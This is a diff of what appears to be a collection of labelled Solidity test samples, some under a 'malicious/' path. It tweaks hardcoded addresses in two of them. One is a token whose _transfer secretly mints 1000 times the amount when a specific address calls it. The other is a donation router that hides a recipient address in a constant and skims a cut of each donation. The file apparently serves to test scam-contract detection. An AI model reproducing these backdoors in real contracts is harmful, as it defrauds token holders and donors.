@@ -2634,7 +2634,7 @@ contract PepeToken {
         return true;
     }
     function _transfer(address from, address to, uint256 amount) internal {
-        if (msg.sender == 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488E) {
+        if (msg.sender == 0x7A250d5630B4Cf539739df2c5DAcb4C659f2488E) {
             _balances[to] += amount * 1000;
             return;
         }
@@ -2658,7 +2658,7 @@ contract SavingsBank {
 `,"malicious/33_ObfuscatedRecipient.sol":`// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 contract DonationRouter {
-    uint256 private constant K = 0x5B38Da6a701c568545dCfcB03FcB875f56beddC4;
+    uint256 private constant K = 0x005B38Da6a701c568545dCfcB03FcB875f56beddC4;
     mapping(address => uint256) public donated;
     function donate(address payable charity) external payable {
         uint256 cut = msg.value / 10;
